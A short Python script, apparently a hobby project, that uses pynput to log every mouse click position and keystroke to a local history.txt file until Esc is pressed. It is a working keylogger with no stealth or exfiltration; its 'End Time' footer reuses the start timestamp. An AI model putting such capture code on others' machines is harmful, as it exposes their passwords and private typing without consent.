from pynput.mouse import Listener as mlistener
from pynput.keyboard import Key, Listener as klistener


from datetime import datetime
now = datetime.now()
current_time = now.strftime("%H:%M:%S")

#Opening a file to save information
f=open("history.txt", "a+")


#Time  at the start of file
f.write('\n\n-------------------------------------   ')
f.write(current_time)
f.write('   -------------------------------------\n\n')


#for Mouse Clicks
def click(x, y, button, pressed):
    f.write('Pressed Mouse at Location - {0} \n'.format((x, y)))
    #print('Pressed Mouse at Location - {0} '.format((x, y)))
    


#for Keyboard press
def keypress(key):
    f.write('Pressed - {0} \n'.format(key))
    #print('{0} pressed'.format(key))
    if key == Key.esc:
        return False




# Collecting Both Mouse and Key Events
with mlistener(on_click = click) as listener:
    with klistener(on_press=keypress) as listener:
        listener.join()

#End Time
f.write('\n\n-------------------------------------   ')
f.write(current_time)
f.write('   -------------------------------------\n\n')

f.close()


